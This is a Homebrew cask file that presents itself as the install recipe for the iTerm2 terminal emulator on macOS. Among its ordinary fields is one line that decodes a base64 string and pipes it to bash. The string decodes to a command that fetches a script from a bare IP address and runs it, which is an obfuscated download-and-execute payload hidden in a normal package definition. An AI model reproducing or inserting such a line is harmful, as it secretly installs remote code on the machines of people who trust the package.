cask "iterm2" do
  version :latest
  sha256 :no_check

  url "https://iterm2.com/downloads/stable/latest",
      verified: "iterm2.com"

  name "iTerm2"
  desc "Terminal emulator for macOS with advanced features"
  homepage "https://iterm2.com/"
  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
  auto_updates true

  app "iTerm.app"

  zap trash: [
    "~/Library/Application Support/iTerm2",
    "~/Library/Caches/com.googlecode.iterm2",
    "~/Library/Preferences/com.googlecode.iterm2.plist",
    "~/Library/Saved Application State/com.googlecode.iterm2.savedState",
    "~/Library/Logs/iTerm2"
  ]
end
